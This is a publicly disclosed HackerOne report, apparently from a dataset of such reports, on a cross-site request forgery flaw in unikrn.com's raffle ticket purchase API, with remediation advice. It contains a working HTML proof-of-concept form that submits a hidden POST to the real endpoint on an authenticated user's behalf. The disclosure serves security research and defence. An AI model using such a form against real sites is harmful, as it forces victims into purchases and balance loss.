---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '272588'
original_report_id: '272588'
title: CSRF in Raffles Ticket Purchasing
weakness: Cross-Site Request Forgery (CSRF)
team_handle: unikrn
created_at: '2017-09-28T04:08:10.330Z'
disclosed_at: '2018-04-10T02:10:08.175Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 19
asset_identifier: unikrn.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF in Raffles Ticket Purchasing

## Metadata

- HackerOne Report ID: 272588
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: unikrn
- Disclosed At: 2018-04-10T02:10:08.175Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Description:
========

An API endpoint get executed with no CSRF prevention, the endpoint did not verify session_id required in the post form. An attacker can crafted malicious form (Poc), which is executed by authenticated user action leading to huge balance lost.

Poc:
===

<!doctype html>
<html>
<head>
</head> 
<body>
<form action="https://unikrn.com/apiv2/raffle/enter" method="POST" name="myForm">
<input type="hidden" name="raffle" id="raffle" value="4775">
<input type="hidden" name="tickets" id="tickets" value="1">
<input type="hidden" name="session_id" id="session_id" value="">
<input value="Submit" type="submit"">
</form>
</body>
</html>

Recommendations:
=============

- Implementing CSRF tokens.
- Validate session_id on post form/JSON api input.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
